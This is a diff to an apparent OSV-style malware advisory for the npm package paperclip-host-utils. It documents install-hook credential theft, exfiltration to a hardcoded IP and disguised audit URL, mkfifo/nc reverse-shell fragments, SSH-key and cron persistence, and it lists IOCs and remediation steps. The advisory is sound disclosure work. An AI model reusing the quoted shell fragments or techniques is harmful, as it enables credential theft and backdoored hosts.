@@ -1,13 +1,13 @@
 {
-  "modified": "2026-07-08T15:20:58Z",
-  "published": "2026-07-07T16:16:40Z",
+  "modified": "2026-07-13T06:32:59Z",
+  "published": "2026-07-07T00:00:00Z",
   "schema_version": "1.7.4",
   "id": "MAL-2026-6947",
   "aliases": [
     "GHSA-m74w-fv2m-jcvw"
   ],
   "summary": "Malicious code in paperclip-host-utils (npm)",
-  "details": "\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (b7e57197a05889313009e318f52b5c6831e6ce6ce928553210c489433d2ef87c)\nOn `npm install`, package.json's postinstall executes dist/setup.js and dist/postinstall.js. The scripts read installer-side secrets — ~/.aws/credentials, ~/.aws/config, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.npmrc, ~/.netrc, ~/.git-credentials, ~/.docker/config.json, GitHub Actions runner paths,.github/workflows contents, and the full process.env — and POST them base64-chunked to http://185.112.147.174:8080/npm/v1/security/audits/quick and http://185.112.147.174:8080/exfil (path disguised as an npm audit endpoint). A `find` sweep across /home/runner, /home/devuser, /work, and /root harvests files matching flag*, *.env, secret*, token*, credentials, and *.kubeconfig — purpose-built for GitHub Actions and CI runners. After exfiltration, a detached shell opens named-pipe reverse shells (`mkfifo /tmp/.f; /bin/sh -i... nc 185.112.147.174 \u003cport\u003e`) in an infinite loop across ports 443, 80, 8080, 7007, 4444, 5555, 1337, and 9001. A sibling routine appends an attacker-controlled ssh-ed25519 key (`deploy@paperclip-host`) to authorized_keys under /root, /home/runner, /home/devuser, /home/paperclip, /home/ec2-user, and /home/centos, and installs /etc/cron.d/paperclip-adapter-sync plus a user crontab entry that calls back to 185.112.147.174:443 every minute. The package name and README impersonate the @paperclipai adapter family as social-engineering cover; the declared dependency `@paperclipai/adapter-utils` is pinned to a suspicious ^2026.626.0. Any machine or CI runner that runs `npm install` on this package is credential-compromised and backdoored.\n\n## Source: ghsa-malware (4a7cf91b41f6980a21fe3a566b9f251bffaf8326222d7e34daeadcf864355768)\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n",
+  "details": "The package 'paperclip-host-utils' is a purpose-built malware package published by the npm account 'srm0rgan' (srm0rgan@proton.me) as part of a coordinated campaign of fake 'Paperclip' VPS-maintenance adapters (siblings: paperclip2, vps-maintenance, vps-maintenance-paperclip-adapter, vps-adapter-core). Its runtime code (`dist/server/execute.js`) presents as a legitimate Paperclip external adapter that runs maintenance shell commands locally or over SSH, which is social-engineering cover for the install-time payload.\n\nFrom version 1.0.2 onward the package declares a malicious install hook that npm runs automatically during `npm install`. The hooked script and payload were repeatedly changed across rapid same-day republishes (1.0.2-1.0.7), an evasion tactic, cycling through three payload variants that all beacon to the hardcoded C2 185.112.147.174:\n\n- Versions 1.0.2-1.0.5 (`postinstall` -\u003e `node dist/postinstall.js`): a persistence + backdoor payload. It appends the attacker's ed25519 key (comment `deploy@paperclip-host`, `AAAAC3NzaC1lZDI1NTE5AAAAIDGA+v9tfK8YVeZejZN2y99mNvefRmQx99lJtjKjIAK2`) to `authorized_keys` for /root, /home/runner, /home/paperclip, /home/ec2-user, /home/centos and /home/ubuntu; installs a crontab entry and `/etc/cron.d/paperclip-adapter-sync` that run a `mkfifo`+`nc` reverse shell to 185.112.147.174:443 every minute; and launches a `mkfifo`+`nc` reverse-shell loop across ports 443, 80, 8080, 7007, 4444, 5555, 1337 and 9001.\n\n- Version 1.0.6 (`postinstall` -\u003e `node dist/setup.js`): a credential stealer disguised as 'npm-compatible telemetry and diagnostics'. It collects whoami/hostname/id/pwd, the full process environment, `git remote`/`git config`, sudo and docker status, and reads AWS credentials/config, SSH private keys, `.npmrc`, `.netrc`, `.git-credentials`, Docker config, `/home/runner/*` CI credentials, and `.github/workflows` files; base64-encodes the data and exfiltrates it in chunks via HTTP POST to `http://185.112.147.174:8080/npm/v1/security/audits/quick` (spoofing an npm audit request), then spawns `mkfifo`+`nc` reverse shells across the same eight ports in a loop.\n\n- Version 1.0.7 (`postinstall` -\u003e `node dist/postinstall.js`): a minimal single reverse shell that connects to 185.112.147.174:443 and pipes a spawned `/bin/sh` over the socket.\n\nVersion 1.0.0 shipped no install hook (the initial hookless facade); the package is malicious from inception as part of the campaign. Any developer workstation or CI job that ran `npm install paperclip-host-utils` at version 1.0.2 or later must be considered fully compromised; rotate all reachable credentials, tokens, and SSH keys from a separate clean machine and remove the attacker key from `authorized_keys`, the injected crontab entry, and `/etc/cron.d/paperclip-adapter-sync`.\n\n---\n_-= Per source details. Do not edit below this line.=-_\n\n## Source: amazon-inspector (b7e57197a05889313009e318f52b5c6831e6ce6ce928553210c489433d2ef87c)\nOn `npm install`, package.json's postinstall executes dist/setup.js and dist/postinstall.js. The scripts read installer-side secrets — ~/.aws/credentials, ~/.aws/config, ~/.ssh/id_rsa, ~/.ssh/id_ed25519, ~/.npmrc, ~/.netrc, ~/.git-credentials, ~/.docker/config.json, GitHub Actions runner paths,.github/workflows contents, and the full process.env — and POST them base64-chunked to http://185.112.147.174:8080/npm/v1/security/audits/quick and http://185.112.147.174:8080/exfil (path disguised as an npm audit endpoint). A `find` sweep across /home/runner, /home/devuser, /work, and /root harvests files matching flag*, *.env, secret*, token*, credentials, and *.kubeconfig — purpose-built for GitHub Actions and CI runners. After exfiltration, a detached shell opens named-pipe reverse shells (`mkfifo /tmp/.f; /bin/sh -i... nc 185.112.147.174 \u003cport\u003e`) in an infinite loop across ports 443, 80, 8080, 7007, 4444, 5555, 1337, and 9001. A sibling routine appends an attacker-controlled ssh-ed25519 key (`deploy@paperclip-host`) to authorized_keys under /root, /home/runner, /home/devuser, /home/paperclip, /home/ec2-user, and /home/centos, and installs /etc/cron.d/paperclip-adapter-sync plus a user crontab entry that calls back to 185.112.147.174:443 every minute. The package name and README impersonate the @paperclipai adapter family as social-engineering cover; the declared dependency `@paperclipai/adapter-utils` is pinned to a suspicious ^2026.626.0. Any machine or CI runner that runs `npm install` on this package is credential-compromised and backdoored.\n\n## Source: ghsa-malware (4a7cf91b41f6980a21fe3a566b9f251bffaf8326222d7e34daeadcf864355768)\nAny computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.\n",
   "affected": [
     {
       "package": {
@@ -30,10 +30,21 @@
         "1.0.2",
         "1.0.5",
         "1.0.7",
-        "1.0.6"
+        "1.0.6",
+        "1.0.3"
       ],
       "database_specific": {
         "cwes": [
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
+          {
+            "cweId": "CWE-506",
+            "description": "The product contains code that appears to be malicious in nature.",
+            "name": "Embedded Malicious Code"
+          },
           {
             "cweId": "CWE-506",
             "description": "The product contains code that appears to be malicious in nature.",
@@ -82,6 +93,50 @@
               "sha256": "fcd44ef92dcf4dcb176f9f2abc6466f4959dbf3de64ed1b015b7009f1a6f8a6a",
               "tlsh": "ff01dd26c9a4cf1365c950c85dba460796b1081b006dbd1433ca217ccb1e2ef44bf35e"
             }
+          ],
+          "package_integrity": [
+            {
+              "filename": "paperclip-host-utils-1.0.2.tgz",
+              "hashes": {
+                "sha1": "3b6bafd1dec8f4ba8ad53c3a28fcd0533f85a969",
+                "sha512_sri": "sha512-luIwh28uceifYzLh/onvmxMQxZLQWa892g1z4G6sy97Z3hLwZvKf+xCTTHEbUWVXldi1Y0MFUl7Dn2nEsIr8Rg=="
+              }
+            },
+            {
+              "filename": "paperclip-host-utils-1.0.3.tgz",
+              "hashes": {
+                "sha1": "b1d6ad66e9d770bbc0436fe4cd5afd66be78cf7e",
+                "sha512_sri": "sha512-Aa9gmZlwkq9dgOhpd3CPphdGRJRIrRPAP/ASdPuK7LMKo/u1wjC0pGre/G0PAZkF3Apw80RMl22uTbR8shoHJQ=="
+              }
+            },
+            {
+              "filename": "paperclip-host-utils-1.0.4.tgz",
+              "hashes": {
+                "sha1": "0e262d9d3668d0d7781fdc4a3ed165434ec9396b",
+                "sha512_sri": "sha512-LdAivMlm+O7JeyW4zL8q/3xWpn6elMXYQS/xDp8IUpHE1W2SyNgZHWRjV3YpsOYHElgH/8XgjLnPj2IObC3KJQ=="
+              }
+            },
+            {
+              "filename": "paperclip-host-utils-1.0.5.tgz",
+              "hashes": {
+                "sha1": "38d289998284f95acae4982bf0bc33746440f7ec",
+                "sha512_sri": "sha512-gcfQRYLFCoMd1ihX7lwmBaJeHymB5Rw/oIcnG98Ky9NuMtuWFzbQSYNupDs/N3eNMmKOfFR+474Er790xTsgmg=="
+              }
+            },
+            {
+              "filename": "paperclip-host-utils-1.0.6.tgz",
+              "hashes": {
+                "sha1": "1a1b911056988def64f170a1a88bb03a10252dae",
+                "sha512_sri": "sha512-CYAjzbHxfPNU3i7drlLhnayGk3vGK4oTU65a6RgBeoMe6ytFE4L2TWAREvvT8ll/FUI6OHDPXbRQfb6G/z2bZA=="
+              }
+            },
+            {
+              "filename": "paperclip-host-utils-1.0.7.tgz",
+              "hashes": {
+                "sha1": "363879e9c85209d563dd5f8c2bd1cd5dd988013f",
+                "sha512_sri": "sha512-3t/ECzf73YVfdTdkiirfK7ubU8xd/3xYa77AxOQLXLFafi3tm+JJDUx00xezaaQinbULHBZn12veHS3Iuq+FFA=="
+              }
+            }
           ]
         }
       }
@@ -115,6 +170,14 @@
     {
       "type": "PACKAGE",
       "url": "https://www.npmjs.com/package/paperclip-host-utils/v/1.0.6"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/paperclip-host-utils/v/1.0.3"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/paperclip-host-utils"
     }
   ],
   "credits": [
@@ -124,9 +187,24 @@
       "contact": [
         "inspector-research@amazon.com"
       ]
+    },
+    {
+      "name": "SafeDep",
+      "type": "FINDER",
+      "contact": [
+        "https://safedep.io"
+      ]
     }
   ],
   "database_specific": {
+    "iocs": {
+      "ips": [
+        "185.112.147.174"
+      ],
+      "urls": [
+        "http://185.112.147.174:8080/npm/v1/security/audits/quick"
+      ]
+    },
     "malicious-packages-origins": [
       {
         "source": "ghsa-malware",
@@ -203,6 +281,16 @@
         "modified_time": "2026-07-08T14:31:03Z",
         "versions": [
           "1.0.6"
+        ]
+      },
+      {
+        "source": "amazon-inspector",
+        "sha256": "f23a8b8d8ad3ef819854d8af5ebcbc769b9b546985943b9594880291554491f9",
+        "import_time": "2026-07-09T17:19:24.897225121Z",
+        "id": "IN-MAL-2026-009330",
+        "modified_time": "2026-07-09T16:56:49Z",
+        "versions": [
+          "1.0.3"
         ]
       }
     ]
